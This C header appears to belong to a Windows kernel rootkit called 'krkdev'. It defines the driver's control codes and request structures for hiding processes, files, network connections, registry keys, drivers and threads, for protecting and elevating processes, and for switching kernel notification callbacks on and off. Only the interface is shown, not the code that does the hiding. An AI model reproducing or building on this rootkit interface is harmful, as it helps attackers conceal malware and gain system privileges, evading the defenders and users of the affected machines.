#ifndef shared_h
#define shared_h

#include "defs.h"

#define device_name L"\\Device\\krkdev"
#define symlink_name L"\\DosDevices\\krkdev"

#define ctl_base 0x800
#define ctl_process (ctl_base + 0x10)
#define ctl_file (ctl_base + 0x20)
#define ctl_net (ctl_base + 0x30)
#define ctl_reg (ctl_base + 0x40)
#define ctl_driver (ctl_base + 0x50)
#define ctl_thread (ctl_base + 0x60)
#define ctl_callback (ctl_base + 0x70)
#define ctl_system (ctl_base + 0x80)

#define ioctl_add_hidden_process CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_process CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_processes CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_add_protected_process CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_protected_process CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_protected_processes CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 5, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_elevate_process CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_hide_process_by_name CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_process + 7, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_add_hidden_file CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_file + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_file CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_file + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_files CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_file + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_add_hidden_connection CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_net + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_connection CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_net + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_connections CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_net + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_add_hidden_reg CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_reg + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_reg CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_reg + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_reg CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_reg + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_add_hidden_driver CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_driver + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_driver CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_driver + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_drivers CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_driver + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_add_hidden_thread CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_thread + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_remove_hidden_thread CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_thread + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_list_hidden_threads CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_thread + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_enable_reg_callback CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_disable_reg_callback CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_enable_proc_notify CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_disable_proc_notify CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_enable_image_notify CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_disable_image_notify CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 5, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_get_proc_log CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_get_image_log CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 7, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_clear_proc_log CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 8, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_clear_image_log CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_callback + 9, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define ioctl_get_status CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_system + 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_ping CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_system + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ioctl_flush_all CTL_CODE(FILE_DEVICE_UNKNOWN, ctl_system + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define max_name_len 260
#define max_path_len 512
#define max_hidden_count 128
#define max_log_entries 64
#define proto_tcp 0
#define proto_udp 1

typedef struct _process_request {
    ULONG pid;
    WCHAR name[max_name_len];
} process_request, *pprocess_request;

typedef struct _file_request {
    WCHAR path[max_path_len];
} file_request, *pfile_request;

typedef struct _net_request {
    ULONG local_port;
    ULONG remote_port;
    ULONG local_addr;
    ULONG remote_addr;
    ULONG pid;
    ULONG protocol;
} net_request, *pnet_request;

typedef struct _reg_request {
    WCHAR path[max_path_len];
} reg_request, *preg_request;

typedef struct _driver_request {
    WCHAR name[max_name_len];
} driver_request, *pdriver_request;

typedef struct _thread_request {
    ULONG tid;
    ULONG owner_pid;
} thread_request, *pthread_request;

typedef struct _proc_log_entry {
    ULONG pid;
    ULONG parent_pid;
    ULONG created;
    WCHAR name[max_name_len];
} proc_log_entry, *pproc_log_entry;

typedef struct _image_log_entry {
    ULONG pid;
    ULONG system_wide;
    WCHAR name[max_path_len];
} image_log_entry, *pimage_log_entry;

typedef struct _status_response {
    ULONG process_hide_active;
    ULONG file_hide_active;
    ULONG net_hide_active;
    ULONG reg_hide_active;
    ULONG driver_hide_active;
    ULONG thread_hide_active;
    ULONG protection_active;
    ULONG reg_callback_active;
    ULONG proc_notify_active;
    ULONG image_notify_active;
    ULONG hidden_process_count;
    ULONG hidden_file_count;
    ULONG hidden_net_count;
    ULONG hidden_reg_count;
    ULONG hidden_driver_count;
    ULONG hidden_thread_count;
    ULONG protected_process_count;
    ULONG proc_log_count;
    ULONG image_log_count;
} status_response, *pstatus_response;

#endif
